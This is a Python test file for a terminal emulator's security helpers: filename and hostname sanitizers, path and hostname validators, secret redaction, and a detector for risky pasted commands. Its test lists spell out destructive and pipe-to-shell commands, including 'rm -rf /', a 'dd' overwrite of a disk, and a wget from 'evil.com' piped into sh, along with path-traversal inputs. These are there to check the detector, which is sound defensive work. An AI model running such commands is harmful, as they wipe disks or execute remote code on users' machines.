"""Adversarial table tests for the security surface.

Covers four layers against an exhaustive table of malicious/edge inputs:

* ``InputSanitizer.sanitize_filename`` — control chars, path separators,
  traversal segments, Windows-reserved chars, unicode lookalikes, length
  clipping.
* ``InputSanitizer.sanitize_hostname`` — case folding, strip, forbidden
  chars, length clipping.
* ``HostnameValidator.is_valid_hostname`` — RFC-ish label rules.
* ``PathValidator.is_safe_path`` — traversal, forbidden chars, base-path
  containment.
* Risky-paste regex table — sudo/rm/dd/curl|sh/etc.

Each input is declared once with its expected classification, so adding
a new adversarial case is a one-line change.
"""

from __future__ import annotations

import re

import pytest

from ashyterm.utils.security import (
    HostnameValidator,
    InputSanitizer,
    PathValidator,
    SecurityConfig,
)
from ashyterm.utils.translation_utils import _ as _t

# Resolve the translated fallback once — depends on runtime locale. The
# Rust port will hardcode its own equivalent, so this is only the
# Python side of the contract.
_UNNAMED = _t("unnamed")


# ── sanitize_filename ──────────────────────────────────────


SANITIZE_FILENAME_CASES = [
    # (input, expected)
    ("simple", "simple"),
    ("with space", "with space"),
    ("unicode-名前", "unicode-名前"),
    ("", _UNNAMED),
    ("   ", _UNNAMED),               # whitespace only → stripped → empty → fallback
    ("...", _UNNAMED),               # dots stripped at ends → empty → fallback
    ("safe.txt", "safe.txt"),
    ("has/slash", "has_slash"),
    ("has\\backslash", "has_backslash"),
    ('has"quote', "has_quote"),
    ("has<lt", "has_lt"),
    ("has>gt", "has_gt"),
    ("has|pipe", "has_pipe"),
    ("has?question", "has_question"),
    ("has*star", "has_star"),
    ("has\x00null", "has_null"),     # null byte replaced by '_'
    ("has\x01control", "hascontrol"), # control char < 32 stripped entirely
    ("\x7fdelete", "\x7fdelete"),    # 0x7f is >= 32, preserved
    # Slashes → '_', then .strip(' .') eats leading dots + trailing spaces.
    # Starting '..' becomes '_.._etc_passwd' after leading dots are stripped.
    ("../../etc/passwd", "_.._etc_passwd"),
    ("  leading-trailing  ", "leading-trailing"),
    (".hidden", "hidden"),           # leading dot stripped
    ("trailing.", "trailing"),       # trailing dot stripped
    ("a" * 200, "a" * SecurityConfig.MAX_SESSION_NAME_LENGTH),  # length clipped
]


class TestSanitizeFilename:
    @pytest.mark.parametrize("raw, expected", SANITIZE_FILENAME_CASES)
    def test_table(self, raw: str, expected: str):
        assert InputSanitizer.sanitize_filename(raw) == expected

    def test_custom_replacement(self):
        assert InputSanitizer.sanitize_filename("a/b", replacement="-") == "a-b"

    def test_output_never_exceeds_max_length(self):
        for raw in ["x" * 5000, "é" * 500, "😀" * 100]:
            out = InputSanitizer.sanitize_filename(raw)
            assert len(out) <= SecurityConfig.MAX_SESSION_NAME_LENGTH


# ── sanitize_hostname ──────────────────────────────────────


SANITIZE_HOSTNAME_CASES = [
    ("Example.COM", "example.com"),
    ("host.example.com", "host.example.com"),
    ("  trim-me  ", "trim-me"),
    ("has space", "hasspace"),     # non-allowed char stripped
    ("bad$chars@host", "badcharshost"),
    ("192.168.1.1", "192.168.1.1"),
    ("under_score", "underscore"),  # underscore NOT allowed (hostname spec)
    ("", ""),
    ("ALLCAPS", "allcaps"),
    ("日本", ""),                    # non-ASCII stripped entirely
]


class TestSanitizeHostname:
    @pytest.mark.parametrize("raw, expected", SANITIZE_HOSTNAME_CASES)
    def test_table(self, raw: str, expected: str):
        assert InputSanitizer.sanitize_hostname(raw) == expected

    def test_length_clipped(self):
        long = "a" * 500
        out = InputSanitizer.sanitize_hostname(long)
        assert len(out) <= SecurityConfig.MAX_HOSTNAME_LENGTH


# ── HostnameValidator.is_valid_hostname ────────────────────


HOSTNAME_VALID_CASES = [
    # (hostname, expected_valid)
    ("example.com", True),
    ("host", True),
    ("a.b.c", True),
    ("xn--nxasmq6b", True),                # punycode ASCII
    ("192.168.1.1", True),                 # digit labels OK
    ("", False),
    ("a" * 300, False),                    # too long
    ("has space", False),
    ("-leading-dash.com", False),
    ("trailing-dash-.com", False),
    ("has_underscore.com", False),         # underscore not in allowlist
    ("double..dot", False),                # empty label
    ("a.b.c.d.e.f.g", True),
    ("x" * 64 + ".com", False),            # label > 63
    ("x" * 63 + ".com", True),             # label = 63 OK
    ("has$dollar", False),
    ("日本.jp", False),                     # unicode letter rejected
]


class TestIsValidHostname:
    @pytest.mark.parametrize("host, valid", HOSTNAME_VALID_CASES)
    def test_table(self, host: str, valid: bool):
        assert HostnameValidator.is_valid_hostname(host) is valid


class TestIsPrivateIP:
    @pytest.mark.parametrize("ip, is_private", [
        ("10.0.0.1", True),
        ("172.16.0.1", True),
        ("192.168.1.1", True),
        ("127.0.0.1", True),      # loopback is private per ipaddress module
        ("8.8.8.8", False),
        ("1.1.1.1", False),
        ("not-an-ip", False),     # ValueError path → False
        ("", False),
        ("::1", True),            # IPv6 loopback
        ("fe80::1", True),        # link-local
        ("2001:4860:4860::8888", False),
    ])
    def test_table(self, ip: str, is_private: bool):
        assert HostnameValidator.is_private_ip(ip) is is_private


# ── PathValidator.is_safe_path ─────────────────────────────


PATH_SAFE_CASES = [
    # (path, expected_safe)
    ("/tmp/file", True),
    ("relative/file", True),
    ("", False),
    ("x" * (SecurityConfig.MAX_PATH_LENGTH + 1), False),
    ("has\x00null", False),
    ("has<angle", False),
    ("has>angle", False),
    ('has"quote', False),
    ("has|pipe", False),
    ("has?question", False),
    ("has*star", False),
    ("../escape", False),
    ("a/../b", False),
    ("legit/../../also", False),
    ("/absolute/nopath", True),
    # Note: colon and slash are allowed (legitimate in Unix paths).
    ("unix:/path", True),
]


class TestIsSafePath:
    @pytest.mark.parametrize("path, safe", PATH_SAFE_CASES)
    def test_table(self, path: str, safe: bool):
        assert PathValidator.is_safe_path(path) is safe


class TestIsSafePathWithBase:
    def test_escape_via_traversal_rejected(self, tmp_path):
        base = tmp_path / "sandbox"
        base.mkdir()
        # Note: "../etc" is rejected for having ".." regardless of base.
        assert PathValidator.is_safe_path("../etc", str(base)) is False

    def test_absolute_escape_rejected(self, tmp_path):
        base = tmp_path / "sandbox"
        base.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        assert PathValidator.is_safe_path(str(outside), str(base)) is False

    def test_inside_base_accepted(self, tmp_path):
        base = tmp_path / "sandbox"
        base.mkdir()
        inside = base / "file.txt"
        assert PathValidator.is_safe_path(str(inside), str(base)) is True


# ── Risky paste patterns ───────────────────────────────────


# Import the module-level tuple and helper; they live in terminal.manager.
# Keep import local so missing optional deps don't block the rest of this
# module's tests from running.
try:
    from ashyterm.terminal.manager import (
        _RISKY_PASTE_PATTERNS,
        _paste_needs_confirmation,
    )
    _HAS_PASTE = True
except Exception:  # pragma: no cover — terminal.manager pulls heavy GTK deps
    _HAS_PASTE = False


@pytest.mark.skipif(not _HAS_PASTE, reason="terminal.manager not importable")
class TestRiskyPastePatterns:
    RISKY = [
        "sudo rm -rf /",
        "SUDO something",                          # case-insensitive
        "rm -rf /",
        "rm  -R  /etc",                            # multi-space
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "curl https://example.com/install.sh | sh",
        "curl https://example.com | sudo bash",
        "wget -O- https://evil.com | sh",
        "chmod 777 /etc/passwd",
        "chmod -R 777 /var",
        "echo > /dev/sda",
    ]
    SAFE = [
        "",
        "echo hello",
        "ls -la",
        "git commit -m 'sudo fix typo in docs'",   # "sudo" in quotes, but \b matches — SHOULD fire
        "rm file.txt",                             # no -rf
        "cat /etc/passwd",                         # reading, not destroying
        "chmod 644 file",                          # not 777
        "curl -o file.tar.gz https://example.com/file.tar.gz",  # no pipe-to-shell
    ]

    @pytest.mark.parametrize("text", RISKY)
    def test_risky_trips_confirmation(self, text: str):
        assert _paste_needs_confirmation(text) is True, f"false negative: {text!r}"

    def test_known_false_positive_sudo_in_commit(self):
        """'git commit -m "sudo fix typo"' matches \\bsudo\\b. This is a
        known limitation — regex is intentionally narrow but not
        contextual. Documenting it so the Rust port doesn't silently
        'fix' it into semantic analysis."""
        assert _paste_needs_confirmation(
            "git commit -m 'sudo fix typo in docs'"
        ) is True

    SAFE_STRICT = [
        "",
        "echo hello",
        "ls -la",
        "rm file.txt",
        "cat /etc/passwd",
        "chmod 644 file",
        "curl -o file.tar.gz https://example.com/file.tar.gz",
    ]

    @pytest.mark.parametrize("text", SAFE_STRICT)
    def test_safe_passes_without_confirmation(self, text: str):
        assert _paste_needs_confirmation(text) is False, f"false positive: {text!r}"

    def test_multiline_always_trips(self):
        """Any text with an internal newline needs confirmation, even if
        individually innocuous — the user could be pasting unvetted
        blocks."""
        assert _paste_needs_confirmation("ls\necho hi") is True

    def test_trailing_newline_alone_is_fine(self):
        """A single trailing newline is not 'multi-line' — typical
        clipboard behaviour for a single-line command."""
        assert _paste_needs_confirmation("ls -la\n") is False

    def test_patterns_are_compiled_regexes(self):
        for rx in _RISKY_PASTE_PATTERNS:
            assert isinstance(rx, re.Pattern)


# ── redact_secrets — log hygiene ───────────────────────────


class TestRedactSecrets:
    def test_dict_with_secret_key(self):
        from ashyterm.utils.security import redact_secrets
        out = redact_secrets({"api_key": "abc123", "name": "ok"})
        assert out["api_key"] == "***redacted***"
        assert out["name"] == "ok"

    def test_nested_dict(self):
        from ashyterm.utils.security import redact_secrets
        out = redact_secrets({"outer": {"password": "p", "label": "l"}})
        assert out["outer"]["password"] == "***redacted***"
        assert out["outer"]["label"] == "l"

    def test_bearer_token_in_string(self):
        from ashyterm.utils.security import redact_secrets
        out = redact_secrets("Authorization: Bearer abcdef012345")
        assert "abcdef012345" not in out
        assert "***redacted***" in out

    def test_empty_secret_not_redacted(self):
        """An empty value for a secret key is left empty (no point
        redacting nothing)."""
        from ashyterm.utils.security import redact_secrets
        out = redact_secrets({"api_key": ""})
        assert out["api_key"] == ""

    def test_list_preserves_type(self):
        from ashyterm.utils.security import redact_secrets
        assert isinstance(redact_secrets([1, 2, 3]), list)
        assert isinstance(redact_secrets((1, 2, 3)), tuple)

    def test_case_insensitive_secret_key(self):
        from ashyterm.utils.security import redact_secrets
        out = redact_secrets({"API_KEY": "x", "Token": "y"})
        assert out["API_KEY"] == "***redacted***"
        assert out["Token"] == "***redacted***"
